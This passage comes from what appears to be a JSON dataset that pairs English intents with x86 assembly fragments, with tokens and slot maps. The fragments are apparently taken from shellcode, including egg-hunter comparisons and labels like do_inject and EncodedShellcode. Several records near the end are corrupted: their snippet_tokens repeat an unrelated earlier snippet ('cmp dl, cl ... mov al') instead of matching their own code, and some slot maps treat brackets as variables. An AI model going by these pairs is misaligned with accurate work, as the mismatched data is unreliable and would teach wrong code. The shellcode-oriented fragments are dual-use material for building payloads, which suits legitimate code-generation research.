      "cmp",
      "BYTE",
      "[",
      "var1",
      "]",
      ",",
      "var2",
      "\\n",
      "jle",
      "var0"
    ]
  },
  {
    "intent": "compare the byte at the address esi and 0xd",
    "rewritten_intent": "compare the byte at the address esi and 0xd",
    "snippet": "cmp byte [esi], 0xd",
    "slot_map": {
      "0xd": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "compare",
      "byte",
      "address",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD",
    "rewritten_intent": "jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD",
    "snippet": "cmp byte [esi], 0xD \\n jl wrap_around",
    "slot_map": {
      "wrap_around": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "lower",
      "byte",
      "value",
      "0xD"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "0xD",
      "\\n",
      "jl",
      "var0"
    ]
  },
  {
    "intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label",
    "rewritten_intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label",
    "snippet": "cmp byte [esi], 0xD \\n jl wrap_around",
    "slot_map": {
      "wrap_around": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "lower",
      "byte",
      "value",
      "0xD",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "0xD",
      "\\n",
      "jl",
      "var1"
    ]
  },
  {
    "intent": "jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register",
    "rewritten_intent": "jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register",
    "snippet": "cmp byte [esi], 0xD \\n jl wrap_around \\n sub byte [esi], 0xD",
    "slot_map": {
      "wrap_around": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "lower",
      "byte",
      "value",
      "0xD",
      "else",
      "subtract",
      "byte",
      "value",
      "0xD",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "0xD",
      "\\n",
      "jl",
      "var0",
      "\\n",
      "sub",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "0xD"
    ]
  },
  {
    "intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register",
    "rewritten_intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register",
    "snippet": "cmp byte [esi], 0xD \\n jl wrap_around \\n sub byte [esi], 0xD",
    "slot_map": {
      "wrap_around": "var2",
      "esi": "var0"
    },
    "intent_tokens": [
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "lower",
      "byte",
      "value",
      "0xD",
      "then",
      "jump",
      "var2",
      "label",
      "else",
      "subtract",
      "byte",
      "value",
      "0xD",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "0xD",
      "\\n",
      "jl",
      "var2",
      "\\n",
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "0xD"
    ]
  },
  {
    "intent": "jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD",
    "rewritten_intent": "jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD",
    "snippet": "cmp byte [esi], 0xD \\n jle wrap_around",
    "slot_map": {
      "wrap_around": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "lower",
      "or",
      "equal",
      "byte",
      "value",
      "0xD"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "0xD",
      "\\n",
      "jle",
      "var0"
    ]
  },
  {
    "intent": "jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register",
    "rewritten_intent": "jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register",
    "snippet": "cmp BYTE al, 2 \\n je do_inject",
    "slot_map": {
      "do_inject": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "byte",
      "representation",
      "2",
      "equal",
      "contents",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "al",
      ",",
      "2",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject",
    "rewritten_intent": "if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject",
    "snippet": "cmp BYTE al, 2 \\n je do_inject",
    "slot_map": {
      "do_inject": "var0"
    },
    "intent_tokens": [
      "if",
      "byte",
      "representation",
      "2",
      "equal",
      "contents",
      "al",
      "register",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "al",
      ",",
      "2",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label",
    "rewritten_intent": "jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label",
    "snippet": "cmp BYTE al, 2 \\n je do_inject \\n jmp while",
    "slot_map": {
      "do_inject": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "byte",
      "representation",
      "2",
      "equal",
      "contents",
      "al",
      "register",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "al",
      ",",
      "2",
      "\\n",
      "je",
      "var0",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject",
    "rewritten_intent": "if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject",
    "snippet": "cmp BYTE al, 2 \\n je do_inject \\n jmp while",
    "slot_map": {
      "do_inject": "var0"
    },
    "intent_tokens": [
      "if",
      "byte",
      "representation",
      "2",
      "equal",
      "contents",
      "al",
      "register",
      "else",
      "jump",
      "while",
      "label",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "al",
      ",",
      "2",
      "\\n",
      "je",
      "var0",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1",
    "rewritten_intent": "if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1",
    "snippet": "cmp BYTE bl, [esi] \\n jne loop_1",
    "slot_map": {
      "loop_1": "var2",
      "esi": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "if",
      "first",
      "byte",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "label",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "var1",
      ",",
      "[",
      "var0",
      "]",
      "\\n",
      "jne",
      "var2"
    ]
  },
  {
    "intent": "jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register",
    "rewritten_intent": "jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register",
    "snippet": "cmp cl, 0x11 \\n jb 0xff \\n add dl, 0x5",
    "slot_map": {
      "0xff": "var0",
      "0x11": "var1"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "unsigned",
      "contents",
      "cl",
      "register",
      "lower",
      "unsigned",
      "value",
      "var1",
      "else",
      "add",
      "0x5",
      "value",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "var1",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "add",
      "dl",
      ",",
      "0x5"
    ]
  },
  {
    "intent": "if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register",
    "rewritten_intent": "if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register",
    "snippet": "cmp cl, 0x11 \\n jb 0xff \\n add dl, 0x5",
    "slot_map": {
      "0x11": "var0",
      "0xff": "var1"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "cl",
      "register",
      "lower",
      "unsigned",
      "value",
      "var0",
      "then",
      "jump",
      "memory",
      "address",
      "var1",
      "else",
      "add",
      "0x5",
      "value",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "var0",
      "\\n",
      "jb",
      "var1",
      "\\n",
      "add",
      "dl",
      ",",
      "0x5"
    ]
  },
  {
    "intent": "jump to the loop label if the contents of the cl register is not equal to the value 0x3",
    "rewritten_intent": "jump to the loop label if the contents of the cl register is not equal to the value 0x3",
    "snippet": "cmp cl, 0x3 \\n jne loop",
    "slot_map": {
      "0x3": "var0"
    },
    "intent_tokens": [
      "jump",
      "loop",
      "label",
      "if",
      "contents",
      "cl",
      "register",
      "not",
      "equal",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "var0",
      "\\n",
      "jne",
      "loop"
    ]
  },
  {
    "intent": "if the contents of the cl register is not equal to the value 0x3 then jump to the loop label",
    "rewritten_intent": "if the contents of the cl register is not equal to the value 0x3 then jump to the loop label",
    "snippet": "cmp cl, 0x3 \\n jne loop",
    "slot_map": {
      "0x3": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "cl",
      "register",
      "not",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "loop",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "var0",
      "\\n",
      "jne",
      "loop"
    ]
  },
  {
    "intent": "jump to the loop2 label if the contents of the cl register is not equal to the value 0x3",
    "rewritten_intent": "jump to the loop2 label if the contents of the cl register is not equal to the value 0x3",
    "snippet": "cmp cl, 0x3 \\n jne loop2",
    "slot_map": {
      "0x3": "var1",
      "loop2": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "cl",
      "register",
      "not",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "var1",
      "\\n",
      "jne",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label",
    "rewritten_intent": "if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label",
    "snippet": "cmp cl, 0x3 \\n jne loop2",
    "slot_map": {
      "0x3": "var0",
      "loop2": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "cl",
      "register",
      "not",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "var0",
      "\\n",
      "jne",
      "var1"
    ]
  },
  {
    "intent": "jump to the label l2 if the contents of the cl register is greater than the decimal value 12",
    "rewritten_intent": "jump to the label l2 if the contents of the cl register is greater than the decimal value 12",
    "snippet": "cmp cl, 12 \\n jg l2",
    "slot_map": {
      "l2": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "cl",
      "register",
      "greater",
      "decimal",
      "value",
      "12"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "12",
      "\\n",
      "jg",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the cl register is greater than the decimal value 12 then jump to the label l2",
    "rewritten_intent": "if the contents of the cl register is greater than the decimal value 12 then jump to the label l2",
    "snippet": "cmp cl, 12 \\n jg l2",
    "slot_map": {
      "l2": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "cl",
      "register",
      "greater",
      "decimal",
      "value",
      "12",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "12",
      "\\n",
      "jg",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12",
    "rewritten_intent": "jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12",
    "snippet": "cmp cl, 12 \\n jge l2",
    "slot_map": {
      "l2": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "cl",
      "register",
      "greater",
      "or",
      "equal",
      "decimal",
      "value",
      "12"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "12",
      "\\n",
      "jge",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2",
    "rewritten_intent": "if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2",
    "snippet": "cmp cl, 12 \\n jge l2",
    "slot_map": {
      "l2": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "cl",
      "register",
      "greater",
      "or",
      "equal",
      "decimal",
      "value",
      "12",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "12",
      "\\n",
      "jge",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register",
    "rewritten_intent": "jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register",
    "snippet": "cmp cl, dl \\n jb l3",
    "slot_map": {
      "l3": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "unsigned",
      "contents",
      "cl",
      "register",
      "lower",
      "unsigned",
      "contents",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "dl",
      "\\n",
      "jb",
      "var0"
    ]
  },
  {
    "intent": "if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3",
    "rewritten_intent": "if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3",
    "snippet": "cmp cl, dl \\n jb l3",
    "slot_map": {
      "l3": "var0"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "cl",
      "register",
      "lower",
      "unsigned",
      "contents",
      "dl",
      "register",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "dl",
      "\\n",
      "jb",
      "var0"
    ]
  },
  {
    "intent": "jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register",
    "rewritten_intent": "jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register",
    "snippet": "cmp cl, dl \\n je EncodedShellcode",
    "slot_map": {
      "EncodedShellcode": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "cl",
      "register",
      "equal",
      "contents",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "dl",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label",
    "rewritten_intent": "if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label",
    "snippet": "cmp cl, dl \\n je EncodedShellcode",
    "slot_map": {
      "EncodedShellcode": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "cl",
      "register",
      "equal",
      "contents",
      "dl",
      "register",
      "then",
      "jump",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "dl",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register",
    "rewritten_intent": "jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register",
    "snippet": "cmp cl, dl \\n je init \\n inc cl",
    "slot_map": {
      "init": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "cl",
      "register",
      "equal",
      "contents",
      "dl",
      "register",
      "else",
      "increment",
      "contents",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "dl",
      "\\n",
      "je",
      "var0",
      "\\n",
      "inc",
      "cl"
    ]
  },
  {
    "intent": "if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register",
    "rewritten_intent": "if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register",
    "snippet": "cmp cl, dl \\n je init \\n inc cl",
    "slot_map": {
      "init": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "cl",
      "register",
      "equal",
      "contents",
      "dl",
      "register",
      "then",
      "jump",
      "var0",
      "label",
      "else",
      "increment",
      "contents",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "cl",
      ",",
      "dl",
      "\\n",
      "je",
      "var0",
      "\\n",
      "inc",
      "cl"
    ]
  },
  {
    "intent": "jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label",
    "rewritten_intent": "jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label",
    "snippet": "cmp dl, 1 \\n je exit \\n jmp reading",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "contents",
      "dl",
      "register",
      "equal",
      "vale",
      "1",
      "else",
      "jump",
      "reading",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "1",
      "\\n",
      "je",
      "exit",
      "\\n",
      "jmp",
      "reading"
    ]
  },
  {
    "intent": "if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label",
    "rewritten_intent": "if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label",
    "snippet": "cmp dl, 1 \\n je exit \\n jmp reading",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "contents",
      "dl",
      "register",
      "equal",
      "vale",
      "1",
      "then",
      "jump",
      "exit",
      "label",
      "else",
      "jump",
      "reading",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "1",
      "\\n",
      "je",
      "exit",
      "\\n",
      "jmp",
      "reading"
    ]
  },
  {
    "intent": "compare the contents of the dl register and 1h",
    "rewritten_intent": "compare the contents of the dl register and 1h",
    "snippet": "cmp dl, 1h",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "contents",
      "dl",
      "register",
      "and",
      "1h"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "1h"
    ]
  },
  {
    "intent": "if the contents of the dl register is greater than the decimal value 27 then jump to the label l3",
    "rewritten_intent": "if the contents of the dl register is greater than the decimal value 27 then jump to the label l3",
    "snippet": "cmp dl, 27 \\n jg l3",
    "slot_map": {
      "l3": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "dl",
      "register",
      "greater",
      "decimal",
      "value",
      "27",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "27",
      "\\n",
      "jg",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l3 if the contents of the dl register is greater than the decimal value 27",
    "rewritten_intent": "jump to the label l3 if the contents of the dl register is greater than the decimal value 27",
    "snippet": "cmp dl, 27 \\n jg l3",
    "slot_map": {
      "l3": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "dl",
      "register",
      "greater",
      "decimal",
      "value",
      "27"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "27",
      "\\n",
      "jg",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27",
    "rewritten_intent": "jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27",
    "snippet": "cmp dl, 27 \\n jge l3",
    "slot_map": {
      "l3": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "dl",
      "register",
      "greater",
      "or",
      "equal",
      "decimal",
      "value",
      "27"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "27",
      "\\n",
      "jge",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3",
    "rewritten_intent": "if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3",
    "snippet": "cmp dl, 27 \\n jge l3",
    "slot_map": {
      "l3": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "dl",
      "register",
      "greater",
      "or",
      "equal",
      "decimal",
      "value",
      "27",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "27",
      "\\n",
      "jge",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register",
    "rewritten_intent": "jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register",
    "snippet": "cmp dl, cl \\n jb l1 \\n mov al, 0x39",
    "slot_map": {
      "0x39": "var1",
      "l1": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "unsigned",
      "contents",
      "dl",
      "register",
      "lower",
      "unsigned",
      "contents",
      "cl",
      "register",
      "else",
      "move",
      "value",
      "var1",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register",
    "rewritten_intent": "if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register",
    "snippet": "cmp dl, cl \\n jb l1 \\n mov al, 0x39",
    "slot_map": {
      "0x39": "var1",
      "l1": "var0"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "dl",
      "register",
      "lower",
      "unsigned",
      "contents",
      "cl",
      "register",
      "then",
      "jump",
      "label",
      "var0",
      "else",
      "move",
      "value",
      "var1",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the dword at the address [eax-4] and egg1",
    "rewritten_intent": "compare the dword at the address [eax-4] and egg1",
    "snippet": "cmp dword [eax-4], egg1",
    "slot_map": {
      "eax-4": "var1",
      "[": "var0",
      "egg1": "var2"
    },
    "intent_tokens": [
      "compare",
      "dword",
      "address",
      "[",
      "var1",
      "]",
      "and",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register",
    "rewritten_intent": "jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register",
    "snippet": "cmp dword [eax-4], egg1 \\n jne _next \\n jmp eax",
    "slot_map": {
      "eax-4": "var2",
      "_next": "var0",
      "[": "var1",
      "egg1": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "[",
      "var2",
      "]",
      "not",
      "equal",
      "contents",
      "stored",
      "var3",
      "address",
      "else",
      "jump",
      "eax",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register",
    "snippet": "cmp dword [eax-4], egg1 \\n jne _next \\n jmp eax",
    "slot_map": {
      "eax-4": "var1",
      "[": "var0",
      "egg1": "var2",
      "_next": "var3"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "[",
      "var1",
      "]",
      "not",
      "equal",
      "contents",
      "stored",
      "var2",
      "address",
      "then",
      "jump",
      "var3",
      "label",
      "else",
      "jump",
      "eax",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register",
    "rewritten_intent": "jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register",
    "snippet": "cmp dword [eax-4], egg2 \\n je _next \\n jmp eax",
    "slot_map": {
      "eax-4": "var2",
      "_next": "var0",
      "[": "var1",
      "egg2": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "[",
      "var2",
      "]",
      "equal",
      "contents",
      "stored",
      "var3",
      "address",
      "else",
      "jump",
      "eax",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register",
    "snippet": "cmp dword [eax-4], egg2 \\n je _next \\n jmp eax",
    "slot_map": {
      "eax-4": "var1",
      "[": "var0",
      "egg2": "var2",
      "_next": "var3"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "[",
      "var1",
      "]",
      "equal",
      "contents",
      "stored",
      "var2",
      "address",
      "then",
      "jump",
      "var3",
      "label",
      "else",
      "jump",
      "eax",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the dword at the memory location [eax-4] with the value of egg1",
    "rewritten_intent": "compare the dword at the memory location [eax-4] with the value of egg1",
    "snippet": "cmp dword [eax-4],egg1",
    "slot_map": {
      "eax-4": "var1",
      "[": "var0",
      "]": "var2",
      "egg1": "var3"
    },
    "intent_tokens": [
      "compare",
      "dword",
      "memory",
      "location",
      "[",
      "var1",
      "]",
      "value",
      "var3"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the dword at the address [eax-8] and egg",
    "rewritten_intent": "compare the dword at the address [eax-8] and egg",
    "snippet": "cmp dword [eax-8], egg",
    "slot_map": {
      "eax-8": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "compare",
      "dword",
      "address",
      "[",
      "var1",
      "]",
      "and",
      "egg"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address",
    "rewritten_intent": "jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address",
    "snippet": "cmp dword [eax-8], egg \\n jne _next",
    "slot_map": {
      "eax-8": "var2",
      "_next": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "[",
      "var2",
      "]",
      "not",
      "equal",
      "contents",
      "stored",
      "egg",
      "address"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label",
    "rewritten_intent": "if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label",
    "snippet": "cmp dword [eax-8], egg \\n jne _next",
    "slot_map": {
      "eax-8": "var1",
      "[": "var0",
      "_next": "var2"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "[",
      "var1",
      "]",
      "not",
      "equal",
      "contents",
      "stored",
      "egg",
      "address",
      "then",
      "jump",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
